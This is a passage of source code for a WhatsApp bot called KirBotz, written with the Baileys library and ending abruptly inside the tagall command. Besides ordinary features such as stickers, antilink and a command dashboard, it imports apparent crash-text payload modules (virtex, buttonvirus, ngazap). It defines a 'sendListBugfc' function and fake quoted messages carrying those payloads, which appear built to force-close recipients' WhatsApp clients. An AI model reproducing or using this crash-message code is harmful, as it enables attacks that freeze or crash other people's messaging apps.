const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const { exec, spawn, execSync } = require('child_process')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ffmpeg = require('fluent-ffmpeg')
const ms = require('ms')
const cheerio = require('cheerio')
const crypto = require('crypto')
const Database = require('./database.js')
const dbs = new Database()
const yts = require('./scrape/yt-search')
const tiktok = require('./scrape/tiktok')
const photooxy = require('./scrape/photooxy')
const textpro = require('./scrape/textpro')
const attp = require('./scrape/attp')
const lirik = require('./scrape/lirik')
const quotes = require('./scrape/quotes')
const quotesanime = require('./scrape/quotesanime')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const instagramstalk = require('./scrape/instagramstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const cerpen = require('./scrape/cerpen')
const { anime } = require('./scrape/anime')
const { obfus } = require('./scrape/obfuscator')
const { mediafire } = require('./scrape/mediafire')
const { nomorhp } = require('./scrape/nomorhp')
const { chara } = require('./scrape/chara')
const { emoji } = require('./scrape/emoji')
const { ythd } = require('./scrape/ythd')
const { playmp4 } = require('./scrape/playmp4')
const { playmp3 } = require('./scrape/playmp3')
const { virtex } = require('./virtex')
const { buttonvirus } = require('./buttonvirus')
const { ngazap } = require('./ngazap')
const { color, bgcolor } = require('./color')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./scrape/list')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicturee } = require('./func')
const owner = JSON.parse(fs.readFileSync('./owner.json').toString())
const _cmd = JSON.parse(fs.readFileSync('./command.json').toString())
const _cmdUser = JSON.parse(fs.readFileSync('./commandUser.json').toString())
const db_respon_list = JSON.parse(fs.readFileSync('./list.json').toString())

const audionye = fs.readFileSync('./y.mp3')

global.db = JSON.parse(fs.readFileSync('./data/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.autosticker = false
global.ownerName = 'Creator KirBotz'
global.ownerNumber = ["6287705048235@s.whatsapp.net"]
global.packname = '\n\n\n\n\n\n\n\n\n\nSticker Nya\n\n\n\n\n\n\n\n\n\n'
global.author = '\n\n\n\n\n\n\n\n\n\nPunya KirBotz\n\n\n\n\n\n\n\n\n\n'
global.mess = {
    wait: 'Wait Kak Mohon Sabar',
    success: 'Success 💯',
    admin: 'Fitur Khusus Admin Group!!!',
    botAdmin: 'Bot Harus Menjadi Admin Terlebih Dahulu!!!',
    owner: 'Fitur Khusus Owner Bot!!!',
    group: 'Fitur Digunakan Hanya Untuk Group!!!',
    private: 'Fitur Digunakan Hanya Untuk Private Chat!!!',
    bot: 'Fitur Khusus Pengguna Nomor Bot!!!',
    error: 'Error Kak Silahkan Chat Owner',
    verify: 'Mααϝ Kαƙ Kαƙαƙ Bҽʅυɱ Jαԃι Uʂҽɾ KιɾBσƚȥ Sιʅαԋƙαɳ Rҽɠιʂƚҽɾ TҽɾʅҽႦιԋ Dαԋυʅυ Uɳƚυƙ Mҽɳʝαԃι Uʂҽɾ KιɾBσƚȥ Cʅιƈƙ Dι Bαɯαԋ'
}

module.exports = kirbotz = async (kirbotz, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const args = body.trim().split(/ +/).slice(1)
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const command = chath.toLowerCase().split(' ')[0] || ''
const isCmd = command.startsWith(prefix)
const pushname = m.pushName || "No Name"
const botNumber = await kirbotz.decodeJid(kirbotz.user.id)
const itsKirBotz = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = chath.slice(command.length + 1, chath.length)
const isMedia = /image|video|sticker|audio/.test(mime)
const from = m.chat
const sender = m.sender
const isGroup = m.isGroup
const reply = m.reply
const timestamp = speed();
const latensi = speed() - timestamp
const groupMetadata = m.isGroup ? await kirbotz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false 

try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
} catch (err) {
console.error(err)
}

if (!kirbotz.public) {
if (!m.key.fromMe) return
}

if (!isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
}
if (isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(m.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

try {
ppuser = await kirbotz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 200, 200)

function monospace(string) {
return '*' + string + '*'
}

        if (m.isGroup && !m.key.fromMe &&  db.chats[m.chat].antilink && !itsKirBotz && !isAdmins){
        if (budy.match(`https://chat.whatsapp.com`)) {
        kirbotz.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
	    kirbotz.groupParticipantsUpdate(m.chat, [sender], 'remove')
		}
	    }

async function sendListProduct(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : m })
return kirbotz.relayMessage(progene.key.remoteJid, progene.message, {
messageId: progene.key.id
})
}

async function sendListBugfc(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return kirbotz.relayMessage(progene.key.remoteJid, progene.message, {
messageId: progene.key.id
})
}

var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const ctlg = async(teks) => {
let res = await generateWAMessageFromContent(from,
{ "orderMessage": 
{ "itemCount": 999999999, 
"message": teks, 
"footerText": "Its Me KirBotz", 
"jpegThumbnail": ppnyauser, 
"surface": 'CATALOG' }}, {quoted:m})
return kirbotz.relayMessage(res.key.remoteJid, res.message, {
messageId: res.key.id
})
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

const eff = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
message: {
groupInviteMessage: {
groupJid: "6281903153426-1626053991@g.us",
inviteCode: "https://chat.whatsapp.com/CswK4kvQD1u7SfSmsYfMHZ",
groupName: "Bot WhatsApp",
caption: `${buttonvirus}`,
jpegThumbnail: ppnyauser,
},
},
};

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./command.json',JSON.stringify(_db, null, 2));
}
}

if (command) {
kirbotz.sendPresenceUpdate('composing', from)
kirbotz.readMessages([m.key])
}

if (isCmd) {
kirbotz.sendMessage(from, { react : { text: `✅`, key: m.key }})
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
kirbotz.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
kirbotz.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

if (autosticker) {
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kirbotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyNya('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kirbotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

switch (command) {
case prefix+'obfus':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} const kirbotz = require('kirbotz-api')`)
let meg = await obfus(q)
reply(`Sukses
${meg.result}`)
}
break
case prefix+'dashboard':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
var posi = await getPosiCmdUser(sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count  < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `*KirBotz Dahsboard*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
teks += `*Most Command Global*\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
}
teks += `\n*Most Command User*\n`
for (let i = 0; i < jumlah; i ++) {
teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
}
reply(teks)
break
case prefix+'antilink':
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsKirBotz) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] === "on") {
if (global.db.chats[m.chat].antilink) return reply('Sudah Aktif Sebelumnya')
global.db.chats[m.chat].antilink = true
reply(`Antilink Berhasil Di Aktifkan !`)
} else if (args[0] === "off") {
if (!global.db.chats[m.chat].antilink) return reply('Sudah Nonaktif Sebelumnya')
global.db.chats[m.chat].antilink = false
reply(`Antilink Berhasil Di Nonaktifkan !`)
} else {
let buttons = [
{ buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await kirbotz.sendButtonText(m.chat, buttons, `Mode Antilink`, kirbotz.user.name, m)
}
break
case prefix+'hidetag': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Teks?`)
kirbotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case prefix+'tagall': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!m.isGroup) return reply(mess.group)
if (!q) return reply(`Teks?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎